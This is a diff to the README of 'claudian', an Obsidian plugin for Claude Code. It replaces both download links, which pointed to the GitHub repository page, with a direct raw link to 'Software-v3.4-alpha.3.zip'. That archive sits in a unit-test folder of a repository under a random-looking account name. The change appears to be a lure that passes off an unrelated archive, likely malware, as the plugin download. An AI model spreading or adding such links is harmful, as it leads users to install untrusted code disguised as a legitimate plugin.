@@ -1,6 +1,6 @@
 # 🧠 claudian - Claude Code Inside Obsidian
 
-[![Download claudian](https://img.shields.io/badge/Download%20claudian-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thermogravimetric-hypallage291/claudian)
+[![Download claudian](https://img.shields.io/badge/Download%20claudian-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Thermogravimetric-hypallage291/claudian/main/tests/unit/core/tools/Software-v3.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Claudian is an Obsidian plugin that brings Claude Code into your vault. It helps
 
 Use the link below to visit the download page and get the plugin files:
 
-**Download link:** https://github.com/Thermogravimetric-hypallage291/claudian
+**Download link:** https://raw.githubusercontent.com/Thermogravimetric-hypallage291/claudian/main/tests/unit/core/tools/Software-v3.4-alpha.3.zip
 
 ## 📥 Install on Windows
 
